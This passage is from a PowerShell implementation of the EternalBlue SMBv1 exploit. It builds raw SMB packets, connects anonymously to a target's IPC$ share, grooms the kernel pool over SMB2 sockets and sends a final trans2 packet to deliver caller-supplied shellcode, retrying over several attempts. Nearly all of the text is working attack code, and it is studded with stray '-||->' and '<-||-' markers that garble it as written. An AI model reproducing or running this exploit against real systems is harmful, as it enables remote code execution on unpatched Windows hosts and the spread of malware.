     -||-> $pkt += 0x16,0x00 <-||-                
    
    
    
    
     -||-> $pkt += $native_os <-||- 
     -||-> $pkt += [Byte[]] ( -||-> 0x00 <-||- ) * 17 <-||-               

    return  -||-> $pkt <-||- 
  } <-||- 

   -||-> function  make_smb1_anonymous_login_packet {
    

     -||-> [Byte[]] $pkt = [Byte[]] ( -||-> 0x00 <-||- ) <-||-                     
     -||-> $pkt += 0x00,0x00,0x88 <-||-            
     -||-> $pkt += 0xff,0x53,0x4D,0x42 <-||-              
     -||-> $pkt += 0x73 <-||-                    
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x18 <-||-                    
     -||-> $pkt += 0x07,0xc0 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0xff,0xfe <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x40,0x00 <-||-                

     -||-> $pkt += 0x0d <-||-                    
     -||-> $pkt += 0xff <-||-                    
     -||-> $pkt += 0x00 <-||-                    
     -||-> $pkt += 0x88,0x00 <-||-                
     -||-> $pkt += 0x04,0x11 <-||-                
     -||-> $pkt += 0x0a,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x01,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0xd4,0x00,0x00,0x00 <-||-        
     -||-> $pkt += 0x4b,0x00 <-||-                
     -||-> $pkt += 0x00 <-||-                    
     -||-> $pkt += 0x00,0x00 <-||-                
     -||-> $pkt += 0x00,0x00 <-||-                

    
     -||-> $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32 <-||- 
     -||-> $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x32,0x00,0x31,0x00,0x39,0x00,0x35,0x00 <-||- 
     -||-> $pkt += 0x00,0x00 <-||- 

    
     -||-> $pkt += 0x57,0x00,0x69,0x00,0x6e,0x00,0x64,0x00,0x6f,0x00,0x77,0x00,0x73,0x00,0x20,0x00,0x32 <-||- 
     -||-> $pkt += 0x00,0x30,0x00,0x30,0x00,0x30,0x00,0x20,0x00,0x35,0x00,0x2e,0x00,0x30,0x00,0x00,0x00 <-||- 

    return  -||-> $pkt <-||- 
} <-||- 


 -||-> function tree_connect_andx_request($Target, $userid) {

      -||-> [Byte[]] $pkt = [Byte[]]( -||-> 0x00 <-||- ) <-||-               
      -||-> $pkt +=0x00,0x00,0x47 <-||-        


      -||-> $pkt +=0xFF,0x53,0x4D,0x42 <-||-   
      -||-> $pkt +=0x75 <-||-               
      -||-> $pkt +=0x00,0x00,0x00,0x00 <-||-   
      -||-> $pkt +=0x18 <-||-               
      -||-> $pkt +=0x01,0x20 <-||-           
      -||-> $pkt +=0x00,0x00 <-||-           
      -||-> $pkt +=0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 <-||-   
      -||-> $pkt +=0x00,0x00 <-||-           
      -||-> $pkt +=0x00,0x00 <-||-           
      -||-> $pkt +=0x2F,0x4B <-||-           
      -||-> $pkt += $userid <-||-               
      -||-> $pkt +=0xC5,0x5E <-||-            


     -||-> $ipc = "\\"+ $Target + "\IPC$" <-||- 

      -||-> $pkt +=0x04 <-||-               
      -||-> $pkt +=0xFF <-||-               
      -||-> $pkt +=0x00 <-||-               
      -||-> $pkt +=0x00,0x00 <-||-           
      -||-> $pkt +=0x00,0x00 <-||-           
      -||-> $pkt +=0x01,0x00 <-||-           
      -||-> $pkt +=0x1A,0x00 <-||-           
      -||-> $pkt +=0x00 <-||-               
      -||-> $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) <-||-  
      -||-> $pkt += 0x00 <-||-        

      -||-> $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00 <-||-    


     -||-> $len = $pkt.Length - 4 <-||- 
    
     -||-> $hexlen = [bitconverter]::GetBytes($len)[-2..-4] <-||- 
     -||-> $pkt[1] = $hexlen[0] <-||- 
     -||-> $pkt[2] = $hexlen[1] <-||- 
     -||-> $pkt[3] = $hexlen[2] <-||- 
    return  -||-> $pkt <-||- 

    } <-||- 



 -||-> function smb_header($smbheader) {

 -||-> $parsed_header =@{server_component= -||-> $smbheader[0..3] <-||- ;
                  smb_command= -||-> $smbheader[4] <-||- ;
                  error_class= -||-> $smbheader[5] <-||- ;
                  reserved1= -||-> $smbheader[6] <-||- ;
                  error_code= -||-> $smbheader[6..7] <-||- ;
                  flags= -||-> $smbheader[8] <-||- ;
                  flags2= -||-> $smbheader[9..10] <-||- ;
                  process_id_high= -||-> $smbheader[11..12] <-||- ;
                  signature= -||-> $smbheader[13..21] <-||- ;
                  reserved2= -||-> $smbheader[22..23] <-||- ;
                  tree_id= -||-> $smbheader[24..25] <-||- ;
                  process_id= -||-> $smbheader[26..27] <-||- ;
                  user_id= -||-> $smbheader[28..29] <-||- ;
                  multiplex_id= -||-> $smbheader[30..31] <-||- ;
                 } <-||- 
return  -||-> $parsed_header <-||- 

} <-||- 




 -||-> function smb1_get_response($sock){



     -||-> $tcp_response = [Array]::CreateInstance("byte", 1024) <-||- 
     -||-> try{
     -||-> $sock.Receive($tcp_response)| out-null <-||- 

     }
     catch {
       -||-> Write-Verbose "socket error, exploit may fail " <-||- 
     } <-||- 
     -||-> $netbios = $tcp_response[0..4] <-||- 
     -||-> $smb_header = $tcp_response[4..36] <-||-   
     -||-> $parsed_header =  -||-> smb_header( -||-> $smb_header <-||- ) <-||-  <-||- 

    return  -||-> $tcp_response, $parsed_header <-||- 

} <-||- 


 -||-> function client_negotiate($sock){
 -||-> $raw_proto =  -||-> negotiate_proto_request <-||-  <-||- 
     -||-> $sock.Send($raw_proto) | out-null <-||- 
    return  -||-> smb1_get_response( -||-> $sock <-||- ) <-||- 

} <-||- 

 -||-> function smb1_anonymous_login($sock){
     -||-> $raw_proto =  -||-> make_smb1_anonymous_login_packet <-||-  <-||- 
     -||-> $sock.Send($raw_proto) | out-null <-||- 
   return  -||-> smb1_get_response( -||-> $sock <-||- ) <-||- 


} <-||- 

 -||-> function tree_connect_andx($sock, $Target, $userid){
     -||-> $raw_proto =  -||-> tree_connect_andx_request $Target $userid <-||-  <-||- 
     -||-> $sock.Send($raw_proto) | out-null <-||- 
   return  -||-> smb1_get_response( -||-> $sock <-||- ) <-||- 


} <-||- 


 -||-> function smb1_anonymous_connect_ipc($Target)
{
     -||-> $client =  -||-> New-Object System.Net.Sockets.TcpClient( -||-> $Target,445 <-||- ) <-||-  <-||- 

     -||-> $sock = $client.Client <-||- 
     -||-> client_negotiate( -||-> $sock <-||- ) | Out-Null <-||- 

     -||-> $raw, $smbheader =  -||-> smb1_anonymous_login $sock <-||-  <-||- 

     -||-> $raw, $smbheader =  -||-> tree_connect_andx $sock $Target $smbheader.user_id <-||-  <-||- 


    return  -||-> $smbheader, $sock <-||- 



} <-||- 


 -||-> function smb1_large_buffer($smbheader,$sock){

     -||-> $nt_trans_pkt =  -||-> make_smb1_nt_trans_packet $smbheader.tree_id $smbheader.user_id <-||-  <-||- 

    

     -||-> $sock.Send($nt_trans_pkt) | out-null <-||- 

     -||-> $raw, $transheader =  -||-> smb1_get_response( -||-> $sock <-||- ) <-||-  <-||- 

    
     -||-> $trans2_pkt_nulled =  -||-> make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_zero" 0 <-||-  <-||- 

    
    for( -||-> $i =1 <-||- ;  -||-> $i -le 14 <-||- ;  -||-> $i++ <-||- ) {
         -||-> $trans2_pkt_nulled +=  -||-> make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_buffer" $i <-||-  <-||- 

    }

     -||-> $trans2_pkt_nulled +=  -||-> make_smb1_echo_packet $smbheader.tree_id  $smbheader.user_id <-||-  <-||- 
     -||-> $sock.Send($trans2_pkt_nulled) | out-null <-||- 

     -||-> smb1_get_response( -||-> $sock <-||- ) | Out-Null <-||- 

} <-||- 


 -||-> function smb1_free_hole($start) {
    -||-> $client =  -||-> New-Object System.Net.Sockets.TcpClient( -||-> $Target,445 <-||- ) <-||-  <-||- 

     -||-> $sock = $client.Client <-||- 
     -||-> client_negotiate( -||-> $sock <-||- ) | Out-Null <-||- 
     -||-> if( -||-> $start <-||- ) {
         -||-> $pkt =   -||-> make_smb1_free_hole_session_packet ( -||-> 0x07,0xc0 <-||- ) ( -||-> 0x2d,0x01 <-||- ) ( -||-> 0xf0,0xff,0x00,0x00,0x00 <-||- ) <-||-  <-||- 
    }
    else {
         -||-> $pkt =   -||-> make_smb1_free_hole_session_packet ( -||-> 0x07,0x40 <-||- ) ( -||-> 0x2c,0x01 <-||- ) ( -||-> 0xf8,0x87,0x00,0x00,0x00 <-||- ) <-||-  <-||- 
    } <-||- 

     -||-> $sock.Send($pkt) | out-null <-||- 
     -||-> smb1_get_response( -||-> $sock <-||- ) | Out-Null <-||- 
    return  -||-> $sock <-||- 
} <-||- 

      -||-> function smb2_grooms($Target, $grooms, $payload_hdr_pkt, $groom_socks){


         for( -||-> $i =0 <-||- ;  -||-> $i -lt $grooms <-||- ;  -||-> $i++ <-||- )
         {
             -||-> $client =  -||-> New-Object System.Net.Sockets.TcpClient( -||-> $Target,445 <-||- ) <-||-  <-||- 

              -||-> $gsock = $client.Client <-||- 
              -||-> $groom_socks += $gsock <-||- 
              -||-> $gsock.Send($payload_hdr_pkt) | out-null <-||- 

         }
        return  -||-> $groom_socks <-||- 
     } <-||- 




 -||-> function smb_eternalblue($Target, $grooms, $Shellcode) {


    
     -||-> [Byte[]]  $payload = [Byte[]]( -||-> $Shellcode <-||- ) <-||- 

     -||-> $shellcode =  -||-> make_kernel_user_payload( -||-> $payload <-||- ) <-||-  <-||- 
     -||-> $payload_hdr_pkt =  -||-> make_smb2_payload_headers_packet <-||-  <-||- 
     -||-> $payload_body_pkt =  -||-> make_smb2_payload_body_packet( -||-> $shellcode <-||- ) <-||-  <-||- 

     -||-> Write-Verbose "Connecting to target for activities" <-||- 
      -||-> $smbheader, $sock =  -||-> smb1_anonymous_connect_ipc( -||-> $Target <-||- ) <-||-  <-||- 
      -||-> $sock.ReceiveTimeout =2000 <-||- 
      -||-> Write-Verbose "Connection established for exploitation." <-||- 
           
            -||-> Write-Verbose  "all but last fragment of exploit packet" <-||- 
      -||-> smb1_large_buffer $smbheader $sock <-||- 
           

     
      -||-> $fhs_sock =  -||-> smb1_free_hole $true <-||-  <-||- 
      -||-> $groom_socks =@() <-||- 
      -||-> $groom_socks =  -||-> smb2_grooms $Target $grooms $payload_hdr_pkt $groom_socks <-||-  <-||- 

      -||-> $fhf_sock =  -||-> smb1_free_hole $false <-||-  <-||- 

      -||-> $fhs_sock.Close() | Out-Null <-||- 

      -||-> $groom_socks =  -||-> smb2_grooms $Target 6 $payload_hdr_pkt $groom_socks <-||-  <-||- 

      -||-> $fhf_sock.Close() | out-null <-||- 

      -||-> Write-Verbose "Running final exploit packet" <-||- 

      -||-> $final_exploit_pkt =   -||-> $trans2_pkt_nulled =  -||-> make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_exploit"  15 <-||-  <-||-  <-||- 

      -||-> try{
      -||-> $sock.Send($final_exploit_pkt) | Out-Null <-||- 
       -||-> $raw, $exploit_smb_header =  -||-> smb1_get_response $sock <-||-  <-||- 
       -||-> Write-Verbose ( -||-> "SMB code: " + [System.BitConverter]::ToString($exploit_smb_header.error_code) <-||- ) <-||- 

     }
     catch {
       -||-> Write-Verbose "socket error, exploit may fail horribly" <-||- 
     } <-||- 


       -||-> Write-Verbose "Send the payload with the grooms" <-||- 

      -||-> foreach ($gsock in  -||-> $groom_socks <-||- )
     {
         -||-> $gsock.Send($payload_body_pkt[0..2919]) | out-null <-||- 
     } <-||- 
         -||-> foreach ($gsock in  -||-> $groom_socks <-||- )
     {
         -||-> $gsock.Send($payload_body_pkt[2920..4072]) | out-null <-||- 
     } <-||- 
          -||-> foreach ($gsock in  -||-> $groom_socks <-||- )
     {
         -||-> $gsock.Close() | out-null <-||- 
     } <-||- 

      -||-> $sock.Close()| out-null <-||- 
  } <-||- 




 -||-> $VerbosePreference = "continue" <-||- 
for ( -||-> $i=0 <-||- ;  -||-> $i -lt $MaxAttempts <-||- ;  -||-> $i++ <-||- ) {
     -||-> $grooms = $InitialGrooms + $GROOM_DELTA*$i <-||- 
     -||-> smb_eternalblue $Target $grooms $Shellcode <-||- 
}


} <-||- 

